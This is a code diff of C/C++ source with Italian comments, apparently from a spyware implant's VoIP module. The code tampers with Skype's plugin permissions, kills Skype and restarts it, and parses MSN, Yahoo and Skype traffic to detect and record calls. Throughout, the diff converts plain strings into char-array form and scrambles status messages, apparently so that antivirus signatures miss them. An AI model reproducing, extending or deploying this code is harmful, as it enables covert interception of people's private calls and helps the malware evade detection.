@@ -1963,6 +1963,15 @@ BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *
 	return FALSE;
 }
 
+DWORD RapidGetFileSize(HANDLE hfile)
+{
+	LARGE_INTEGER li;
+	li.LowPart = INVALID_FILE_SIZE;
+	if (!GetFileSizeEx(hfile, &li))
+		return INVALID_FILE_SIZE;
+	return li.LowPart;
+}
+
 // Verifica se nel file di config c'e' la nostra ACL
 // Se non riesce ad aprire il file, torna che l'acl c'e'. Altrimenti potrebbe scriverla piu' volte...tanto poi non riuscirebbe comunque a scriverla
 BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
@@ -1979,7 +1988,7 @@ BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, 
 	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return TRUE;
 	
-	config_size = GetFileSize(hFile, NULL);
+	config_size = RapidGetFileSize(hFile);
 	if (config_size == INVALID_FILE_SIZE) {
 		CloseHandle(hFile);
 		return TRUE;
@@ -2038,7 +2047,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return FALSE;
 	
-	config_size = GetFileSize(hFile, NULL);
+	config_size = RapidGetFileSize(hFile);
 	if (config_size == INVALID_FILE_SIZE) {
 		CloseHandle(hFile);
 		return FALSE;
@@ -2277,6 +2286,16 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 	return TRUE;
 }
 
+void StartSkypeAsUser(char *skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION *pi)
+{
+	HANDLE hToken;
+	if (hToken = GetMediumLevelToken()) {
+		HM_CreateProcessAsUser(skype_exe_path, 0, si, pi, 0, hToken);
+		CloseHandle(hToken);
+	}
+}
+
+
 // Inserisce i permessi corretti per potersi attaccare a skype come plugin
 void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 {
@@ -2328,7 +2347,6 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 		if (hSkype = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, skype_pid)) {
 			STARTUPINFO si;
 			PROCESS_INFORMATION pi;
-			HANDLE hToken;
 
 			TerminateProcess(hSkype, 0);
 			CloseHandle(hSkype);
@@ -2337,10 +2355,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 			Sleep(1000); // Da' un po' di tempo per killare il processo
 			//si.wShowWindow = SW_SHOW;
 			//si.dwFlags = STARTF_USESHOWWINDOW;
-			if (hToken = GetMediumLevelToken()) {
-				HM_CreateProcessAsUser(skype_exe_path, 0, &si, &pi, 0, hToken);
-				CloseHandle(hToken);
-			}
+			StartSkypeAsUser(skype_exe_path, &si, &pi);
 		}
 	}
 }
@@ -2394,24 +2409,26 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 BOOL ParseMsnMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 {	
 	char *ptr = NULL, *tmp = NULL, *MsnID = NULL;
-
+	char space[] = { ' ', 0};
+	char separator[] = { ';', '{', 0};
+		
 	if (*pdwFlags & FLAGS_MSN_OUT) {
 		NullTerminatePacket(*pdwLen, msg);
 		
 		// Cerchiamo il primo spazio e spostiamoci avanti
-		if(ptr = strstr((char *)msg, " "))
+		if(ptr = strstr((char *)msg, space))
 			ptr++;
 		else
 			return TRUE;
 
 		// Facciamo la stessa cosa col secondo spazio
-		if(ptr && (ptr = strstr((char *)ptr, " ")))
+		if(ptr && (ptr = strstr((char *)ptr, space)))
 			ptr++;
 		else
 			return TRUE;
 
 		// Terminiamo al terzo spazio
-		if(ptr && (tmp = strstr((char *)ptr, " ")))
+		if(ptr && (tmp = strstr((char *)ptr, space)))
 			*tmp = 0;
 		else
 			return TRUE;
@@ -2425,7 +2442,7 @@ BOOL ParseMsnMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	// Se ha trovato un nuovo interlocutore
 	if (MsnID) {
 		// Toglie l'uid
-		ptr = strstr(MsnID, ";{");
+		ptr = strstr(MsnID, separator);
 		if (ptr)
 			*ptr = 0;
 
@@ -2456,7 +2473,8 @@ BOOL ParseGtalkMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 {	
 	char *ptr = NULL, *tmp_ptr = NULL;
 	char *GTID = NULL;
-	if (*pdwFlags & FLAGS_GTALK_IN) {
+
+/*	if (*pdwFlags & FLAGS_GTALK_IN) {
 		NullTerminatePacket(*pdwLen, msg);
 		if ( (ptr = strchr((char *)msg, '>')) && !strncmp(++ptr, "<session ", strlen("<session ")) && (tmp_ptr = strchr(ptr, '>')) ) {
 			*tmp_ptr = 0;
@@ -2503,7 +2521,7 @@ BOOL ParseGtalkMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 			call_list_head->voip_program = VOIP_GTALK;
 		}
 	}
-
+	*/
 	if ((*pdwFlags & FLAGS_GTALK_IN) || (*pdwFlags & FLAGS_GTALK_OUT)) 
 		return TRUE;
 
@@ -2517,21 +2535,31 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	char YID[64];
 	char invite[10];
 	DWORD seq = 0xfffffff;
+	char sip_tag[] = { 'S', 'I', 'P', '/', '2', '.', '0', ' ', '2', '0', '0', ' ', 'O', 'K', '+', 0x0 }; //"SIP/2.0 200 OK"
+	char to_tag[] = { 'T', 'o', ':', ' ', 0x0 }; //"To: "
+	char to_sip[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"To: <sip:"
+	char to_sip_format[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"To: <sip:%63s"
+	char minus_sip[] = { '<', 's', 'i', 'p', 0x0 }; //"<sip"
+	char from_tag[] = { 'F', 'r', 'o', 'm', ':', ' ', 0x0 }; //"From: "
+	char from_sip[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"From: <sip:"
+	char from_sip_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"From: <sip:%63s"
+	char call_id_tag[] = { 'C', 'a', 'l', 'l', '-', 'I', 'D', ':', ' ', 0x0 }; //"Call-ID: "
+	char call_seq_tag[] = { 'C', 'S', 'e', 'q', ':', ' ', 0x0 }; //"CSeq: "
 
 	if (*pdwFlags & FLAGS_YMSG_IN) {
 		// Nuova chiamata
 		NullTerminatePacket(*pdwLen, msg);
-		if ( ptr = strstr((char *)msg, "SIP/2.0 200 OK") ) {
-			if (ptr = strstr(ptr, "To: ")) {
+		if ( ptr = strstr((char *)msg, sip_tag) ) {
+			if (ptr = strstr(ptr, to_tag)) {
 				ZeroMemory(YID, sizeof(YID));
 				// Cerca il nome del peer se la chiamata e' iniziata da locale
-				if (!strncmp(ptr, "To: <sip:", strlen("To: <sip:"))) {
-					sscanf(ptr, "To: <sip:%63s", YID);
+				if (!strncmp(ptr, to_sip, strlen(to_sip))) {
+					sscanf(ptr, to_sip_format, YID);
 					if(tmp = strstr(YID, "@"))
 						tmp[0] = 0;
 				} else {
-					sscanf(ptr, "To: %63s", YID);
-					if(tmp = strstr(YID, "<sip"))
+					sscanf(ptr, to_sip_format, YID);
+					if(tmp = strstr(YID, minus_sip))
 						tmp[0] = 0;
 				}
 				is_interesting = TRUE;
@@ -2542,17 +2570,17 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	if (*pdwFlags & FLAGS_YMSG_OUT) {
 		// Nuova chiamata
 		NullTerminatePacket(*pdwLen, msg);
-		if ( ptr = strstr((char *)msg, "SIP/2.0 200 OK") ) {
-			if (ptr = strstr(ptr, "From: ")) {
+		if ( ptr = strstr((char *)msg, sip_tag) ) {
+			if (ptr = strstr(ptr, from_tag)) {
 				ZeroMemory(YID, sizeof(YID));
 				// Cerca il nome del peer se la chiamata e' iniziata da remoto
-				if (!strncmp(ptr, "From: <sip:", strlen("From: <sip:"))) {
-					sscanf(ptr, "From: <sip:%63s", YID);
+				if (!strncmp(ptr, from_sip, strlen(from_sip))) {
+					sscanf(ptr, from_sip_format, YID);
 					if(tmp = strstr(YID, "@"))
 						tmp[0] = 0;
 				} else {
-					sscanf(ptr, "From: %63s", YID);
-					if(tmp = strstr(YID, "<sip"))
+					sscanf(ptr, from_sip_format, YID);
+					if(tmp = strstr(YID, minus_sip))
 						tmp[0] = 0;
 				}
 				is_interesting = TRUE;
@@ -2564,7 +2592,7 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	// Ora vediamo se e' un inizio o fine chiamata. Se non trova il destinatario
 	// questa parte non e' "interesting"
 	if (is_interesting && ptr) {
-		if (strstr(ptr, "Call-ID: ") && (ptr = strstr((char *)msg, "CSeq: "))) {
+		if (strstr(ptr, call_id_tag) && (ptr = strstr((char *)msg, call_seq_tag))) {
 			sscanf(ptr, "CSeq: %d %6s", &seq, invite);
 			// Comincia la registrazione se e' una nuova chiamata o se e' stato fatto il resume di una
 			// chiamata messa precedentemente in hold
@@ -2603,9 +2631,25 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	DWORD call_id;
 	char req_buf[256];
 
+	char id_num[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', 0x0 }; //"#14113009"
+	char partner_h_id[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', ' ', '%', 's', 0x0 }; //"#14113009 CALL %d PARTNER_HANDLE %s"
+	char id_local_hold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'L', 'O', 'C', 'A', 'L', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS LOCALHOLD"
+	char id_remotehold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'E', 'M', 'O', 'T', 'E', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS REMOTEHOLD"
+	char id_finished[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'F', 'I', 'N', 'I', 'S', 'H', 'E', 'D', 0x0 }; //"STATUS FINISHED"
+	char id_inprogress[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'I', 'N', 'P', 'R', 'O', 'G', 'R', 'E', 'S', 'S', 0x0 }; //"STATUS INPROGRESS"
+	char id_inprogress_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'I', 'N', 'P', 'R', 'O', 'G', 'R', 'E', 'S', 'S', 0x0 }; //"CALL %d STATUS INPROGRESS"
+	char id_partic_count[] = { 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"CONF_PARTICIPANTS_COUNT"
+
+	char format_partner_handle[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', 0x0 }; //"#14113009 GET CALL %d PARTNER_HANDLE"
+	char format_conf_part[] = { 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"GET CALL %d CONF_PARTICIPANTS_COUNT"
+	char format_call_stat[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', '%', 's', 0x0 }; //"CALL %d STATUS %s"
+	char format_call_part[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', ' ', '%', 'd', 0x0 }; //"CALL %d CONF_PARTICIPANTS_COUNT %d"
+
+	char string_obfs[] = { '_', ' ', 'O', 'E', 'P', 'U', 'v', 'E', 't', 'U', 'P', 'C', ' ', 'X', 'Q', 'y', 'c', ' ', 'H', 'd', 'l', 'd', 'l', '1', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', 'Q', 'M', 0x0d, 0x0a, 0x0}; // "_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"
+
 	if (*pdwFlags & FLAGS_SKAPI_MSG) {
 		NullTerminatePacket(*pdwLen, msg);
-		if (!strncmp((char *)msg, "#14113009", 9)) {
+		if (!strncmp((char *)msg, id_num, 9)) {
 			// Skype ha risposto alle nostre richieste dicendo chi e' l'interlocutore
 			// per questa chiamata
 			partner_entry *curr_partner;
@@ -2613,7 +2657,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 
 			if (! (partner_handle = (char *)calloc(strlen((char *)msg), sizeof(char))) )
 				return TRUE;
-			sscanf((char *)msg, "#14113009 CALL %d PARTNER_HANDLE %s", &call_id, partner_handle);
+			sscanf((char *)msg, partner_h_id, &call_id, partner_handle);
 			//Log_Sanitize(partner_handle);
 
 			// vede se abbiamo gia' in lista questa chiamata
@@ -2645,26 +2689,26 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 			curr_partner->flags = 0;
 			curr_partner->voip_program = VOIP_SKYPE;
 			call_list_head = curr_partner;
-		} else if (strstr((char *)msg, "STATUS INPROGRESS") && skype_api_wnd) {
+		} else if (strstr((char *)msg, id_inprogress) && skype_api_wnd) {
 			DWORD dummy;
 			
 			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
-			sscanf((char *)msg, "CALL %d STATUS INPROGRESS", &call_id);
-			sprintf(req_buf, "#14113009 GET CALL %d PARTNER_HANDLE", call_id);
+			sscanf((char *)msg, id_inprogress_format, &call_id);
+			sprintf(req_buf, format_partner_handle, call_id);
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
 			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
-			sprintf(req_buf, "GET CALL %d CONF_PARTICIPANTS_COUNT", call_id);
+			sprintf(req_buf, format_conf_part, call_id);
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
 			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
-		} else if (strstr((char *)msg, "STATUS LOCALHOLD") || strstr((char *)msg, "STATUS REMOTEHOLD") || strstr((char *)msg, "STATUS FINISHED")) {
+		} else if (strstr((char *)msg, id_local_hold) || strstr((char *)msg, id_remotehold) || strstr((char *)msg, id_finished)) {
 			// Una chiamata e' stata terminata o messa in attesa
 			partner_entry **curr_partner, *tmp_partner;
-			sscanf((char *)msg, "CALL %d STATUS %s", &call_id, req_buf);
+			sscanf((char *)msg, format_call_stat, &call_id, req_buf);
 			
 			for (curr_partner = &call_list_head; *curr_partner; curr_partner=&((*curr_partner)->next)) 
 				if ((*curr_partner)->Id == call_id) {
@@ -2677,11 +2721,11 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 					SAFE_FREE(tmp_partner);
 					break;
 				}
-		} else if (strstr((char *)msg, "CONF_PARTICIPANTS_COUNT")) {
+		} else if (strstr((char *)msg, id_partic_count)) {
 			// Skype ci ha risposto dicendo quante persone stanno partecipando a una chiamata (da remoto)
 			DWORD participant_count;
 			partner_entry *curr_partner;
-			sscanf((char *)msg, "CALL %d CONF_PARTICIPANTS_COUNT %d", &call_id, &participant_count);
+			sscanf((char *)msg, format_call_part, &call_id, &participant_count);
 			for (curr_partner = call_list_head; curr_partner; curr_partner=curr_partner->next) 
 				if (curr_partner->Id == call_id) {
 					if (participant_count > 0)
@@ -2694,7 +2738,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		return TRUE;
 	}
 	if (*pdwFlags & FLAGS_SKAPI_WND) {
-		ScrambleString ss("_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"); // "- Monitoring VOIP queues.............OK\r\n"
+		ScrambleString ss(string_obfs); // "- Monitoring VOIP queues.............OK\r\n"
 		REPORT_STATUS_LOG(ss.get_str());
 		skype_api_wnd = *((HWND *)msg);
 		return TRUE;
@@ -2763,11 +2807,11 @@ DWORD __stdcall PM_VoipRecordDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FIL
 		return 1;
 	if (ParseMsnMsg(msg, &dwLen, &dwFlags))
 		return 1;
-
+		
 	// Intercetta i messaggi di sampling rate
 	if (ParseSamplingMsg(msg, &dwLen, &dwFlags))
 		return 1;
-
+		
 	// Registra solo se ci sono chiamate in corso
 	if (!call_list_head)
 		return 1;
